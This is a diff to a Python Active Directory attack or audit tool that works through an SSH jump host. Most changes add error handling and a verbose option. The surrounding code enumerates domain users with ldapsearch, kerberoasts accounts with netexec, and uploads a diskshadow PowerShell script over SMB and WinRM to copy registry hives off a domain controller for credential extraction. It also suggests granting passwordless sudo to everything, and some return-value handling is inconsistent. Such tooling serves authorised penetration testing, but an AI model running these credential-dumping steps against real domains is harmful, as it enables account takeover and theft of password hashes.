@@ -83,7 +83,7 @@ def run_ssh_command(host, command):
             command
         ]
         result = subprocess.run(ssh_command, capture_output=True, text=True)
-        return (True, result.stdout)
+        return (True, result.stdout, result.stderr or "")
     except subprocess.CalledProcessError as e:
         return (False, e.stderr)
 
@@ -117,7 +117,7 @@ def validate_access(config):
         },
         'sudo_nopasswd': {
             'cmd': 'sudo -n true',
-            'fix': 'Run "sudo visudo" and add: "USER ALL=(ALL) NOPASSWD: ALL"'
+            'fix': 'Run "sudo visudo" and add: "$USER ALL=(ALL) NOPASSWD: ALL"'
         }
     }
 
@@ -240,7 +240,10 @@ def en_users(jh, dc_ip, user, password, domain):
     command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users_descriptions"""
 
     en = run_ssh_command(jh, command1)
-    print('Enabled users gathered!')
+    if len(en[2]) != 0:
+        print(en[2])
+        exit()
+    print('Enabled users gathered!', en)
     en_adm = run_ssh_command(jh, command2)
     print('High privilege users gathered!')
     us_desc = run_ssh_command(jh, command3)
@@ -256,8 +259,9 @@ def en_users(jh, dc_ip, user, password, domain):
 
 def roasting(jh, dc_ip, user, password, domain):
     netexec = run_ssh_command(jh, 'command -v netexec')
-    if len(netexec[1]) == 0:
+    if len(netexec[2]) != 0:
         print('The following tool is missing: netexec')
+        print('Tool error:\n', netexec[2])
         exit()
 
     kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting kerberoasted-users"
@@ -390,7 +394,7 @@ def responder_run(jh, config_file=None):
 
 
 
-def pas_audit(dc_ip, user, password, domain, jh=None):
+def pas_audit(dc_ip, user, password, domain, jh=None, verbose=False):
     powershell_code = r'''
 $DiskshadowScript = @"
 set context persistent nowriters
@@ -425,19 +429,34 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
             
     # print(powershell_code)
     if jh:
+        if '@' in user:
+            user = user.split('@')[0]
 
+        netexec = run_ssh_command(jh, 'command -v nxc')
+        if len(netexec[1]) == 0:
+            print(color_text('\nThe following tool is missing: netexec\n',Color.RED))
+            # print('Tool error:\n', netexec[2])
+            print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD),"\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
+            exit()
         script = copy_files('audit.ps1', f'{jh}:~/audit.ps1')
 
         command1 = r"nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --put-file audit.ps1 \\\\Windows\\\\Temp\\\\audit.ps1"
 
-        # print(command1)
-        print('uploading audit.ps1 file to the target.')
+        # print(command1)color_text("\nAll systems go! All requirements are met.", Color.GREEN, BOLD, END, yellow)
+        print(color_text('\nUploading audit.ps1 file to the target.\n', Color.BOLD))
         cp_audit = run_ssh_command(jh, command1)
-
+        if '[-]' in cp_audit[1]:
+            print(color_text('Credentials are not working. This is the netexec output:\n\n', Color.RED), cp_audit[1])
+            # print(cp_audit[1])
+            exit()
+        
         command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
         
-        print('running diskshadow')
+        print(color_text('\nRunning diskshadow.\n', Color.BOLD))
         run_audit = run_ssh_command(jh, command2)        
+        if verbose:
+            print(command2)
+            print(run_audit[1])
 
         command31 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\SYSTEM.hive SYSTEM.hive"
         command32 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\copy-system.hive copy-system.hive"
@@ -447,7 +466,10 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         jh_grab_audit1 = run_ssh_command(jh, command31)
         jh_grab_audit2 = run_ssh_command(jh, command32)
         jh_grab_audit3 = run_ssh_command(jh, command33)
-
+        if verbose:
+            print(command31,'\n', command32, '\n',command33,'\n')
+            print(jh_grab_audit1[1], '\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')
+        
         # create local directory
         create_local_dir = ['mkdir', f'password-audit']
         create = subprocess.run(create_local_dir, capture_output=True, text=True)
@@ -518,6 +540,7 @@ def main():
     pasaudit_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
     pasaudit_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
     pasaudit_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")
+    pasaudit_parser.add_argument("-verbose", "-v", required=False, action=argparse.BooleanOptionalAction, help="Verbose output. You will see each running command and it's output.")
     
     parse_parser = subparsers.add_parser("parse", help="Parse nmap output.")
     parse_parser.add_argument("--nmap-output", "-n", required=True, help="Path to nmap output directory or file.")
@@ -566,7 +589,7 @@ def main():
 
     if args.mode == 'pass-audit':
         if args.jumphost:
-            pas_audit(args.dc_ip, args.user, args.password, args.domain, args.jumphost)
+            pas_audit(args.dc_ip, args.user, args.password, args.domain, args.jumphost, args.verbose)
         else:
             pas_audit(args.dc_ip, args.user, args.password, args.domain)
         # pas_audit()
